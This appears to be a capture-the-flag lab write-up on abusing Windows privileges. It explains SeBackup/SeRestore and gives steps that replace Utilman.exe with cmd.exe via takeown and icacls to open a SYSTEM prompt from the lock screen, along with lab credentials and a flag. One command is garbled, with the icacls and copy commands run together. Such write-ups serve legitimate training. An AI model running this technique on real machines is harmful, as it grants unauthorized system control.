**TASK 6: Abusing dangerous privileges**

# Window Privileges 

Privileges are rights that an account has to perform specific system-related tasks. 
These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.

Priv can be checked using :

      whoami /priv


# SeBackup / SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.


Now lets get connected to our machine 

    xfreerdp /v:<machineip> /u:THMBackup /p:CopyMaster555
![Screenshot 2023-10-25 115343](https://github.com/Theincognitomode/Windows-Privilege-Escalation-WriteUP/assets/73027020/538db4d5-965e-461d-8901-497b313bf00e)

Now lets follow the steps from the tasks..

In order to get the flag we have to follow the instruction that are below **SeTakeOwnership**

Basically have to execute three steps 

Make sure you are running these commands in the administrator prompt 
-     takeown /f C:\Windows\System32\Utilman.exe
-     icacls C:\Windows\System32\Utilman.exe 
-     /grant THMTakeOwnership:Fcopy cmd.exe utilman.exe

![image](https://github.com/Theincognitomode/Windows-Privilege-Escalation-WriteUP/assets/73027020/56dbe199-64a5-4905-995c-92175336a177)

Now lock the screen and click on `**Ease of access**` option a cmd will pop up

![image](https://github.com/Theincognitomode/Windows-Privilege-Escalation-WriteUP/assets/73027020/a9ca7f4a-b5c0-4d85-a051-50cd952137c5)  

    THM{SEFLAGPRIVILEGE}

There you go..
